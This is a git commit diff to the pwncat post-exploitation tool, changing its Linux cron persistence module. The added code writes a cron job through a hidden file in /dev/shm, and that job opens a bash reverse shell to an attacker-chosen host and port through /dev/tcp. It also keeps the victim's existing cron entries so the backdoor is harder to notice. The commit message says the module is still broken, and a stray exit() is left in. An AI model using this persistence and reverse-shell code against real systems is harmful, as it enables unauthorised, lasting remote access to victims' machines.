993b13affede219a3c8b6f3e9975e7753eb119a7
montysecurity <jacobcainmontgomery@gmail.com>
2020-10-16 22:34:36 -0500

    still broken; seems to only run the write test if all 3 variables are manually set

--- pwncat/modules/persist/cron.py
+++ pwncat/modules/persist/cron.py
@@ -25,54 +25,56 @@ class Module(PersistModule):
     PLATFORM = pwncat.platform.Platform.LINUX
 
     def install(self, user, lhost, lport, schedule, shell):
-        # Interesting note: was tested on a raspberry pi (gen 3) and failed every time. No error was raised. No matter what "pwncat.victim.run" was populated with, it would not execute
+        # Interesting note: was tested on a raspberry pi (gen 3) and failed every time. No error was raised. No matter what "pwncat.victim.run" was populated with, it would not execute. I later bricked my pi in testing, test on your own pi at your own discretion lol
         if shell == "current":
-            shell = pwncat.victim.shell  
-        
+            shell = pwncat.victim.shell
+            
         try:
             user_entries = pwncat.victim.env(["crontab", "-l"]).decode("utf-8") #stolen from enum/cron.py module, thanks :)
+            # using random data to test write privileges
             randint = str(random.randint(1024, 65535)).strip()
             cron = CronTab(user=True)
             job = cron.new(command='echo ' + randint)
             job.minute.every(1)
             with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
                 flip.write(f"{job}\n")
-            pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
+            pwncat.victim.run("crontab /dev/shm/.pwncron")
+            exit()
         except (PermissionError) as exc:
             raise PersistError(str(exc))
-        
+
+        # removing random data
         with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
             flip.write(f"{user_entries}")
         pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
 
+        #if schedule != "" and lhost != "" and lport != "":
+        payload = str("bash -c 'bash -i > /dev/tcp/" + str(lhost) + "/" + str(lport) + " 0>&1'")
+        job = cron.new(command=payload)
+        c = 0
+        for number in schedule.split():
+            if number != str("*"):
+                if c == 0:
+                    job.minute.every(schedule.split()[0]) # 0-59
+                if c == 1:
+                    job.hour.every(schedule.split()[1]) # 0-23
+                if c == 2:
+                    job.day.on(schedule.split()[2]) # 1-31
+                if c == 3:
+                    job.month.on(schedule.split()[3]) # 1-12
+                if c == 4:
+                    job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
+                c += 1
+                # if number = * then do not set, the crontab module assumes that as default
 
-        #pwncat.victim.run([cron.remove(job)])
-        #pwncat.victim.run([cron.write()])
-        #pwncat.victim.run([f"crontab -l"], wait=True)
-        #pwncat.victim.env(["crontab", "-l"]).decode("utf-8")
-        exit()
-        
-        if schedule != "" and lhost != "" and lport != "":
-            cron = CronTab(user=True)
-            payload = str("bash -c 'bash -i > /dev/tcp/" + str(lhost) + "/" + str(lport) + " 2>&1'")
-            job = cron.new(command=payload)
-            c = 0
-            for number in schedule.split():
-                if number != str("*"):
-                    if c == 0:
-                        pwncat.victim.run([job.minute.every(schedule.split()[0])]) # 0-59
-                    if c == 1:
-                        pwncat.victim.run([job.hour.every(schedule.split()[1])]) # 0-23
-                    if c == 2:
-                        pwncat.victim.run([job.day.on(schedule.split()[2])]) # 1-31
-                    if c == 3:
-                        pwncat.victim.run([job.month.on(schedule.split()[3])]) # 1-12
-                    if c == 4:
-                        pwncat.victim.run([job.dow.on(schedule.split()[4])]) # 0-6 (0 = Sunday)
-                    c += 1
-                    # if number = * then do not set, the crontab module assumes that as default
-            #pwncat.victim.run([cron.write()])
-            pwncat.victim.run(["echo", job, "|", "crontab"])
+            # Using files to write to crontab because previous efforts to pipe to crontab failed
+
+        with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
+            # we are appending so we do not erase any legitimate crons
+            flip.write(f"{user_entries}")
+            flip.write(f"{job}\n")
+        pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
+
 
     def remove(self, user, lhost, lport, schedule, shell):
         """ Remove any modifications from the remote victim """
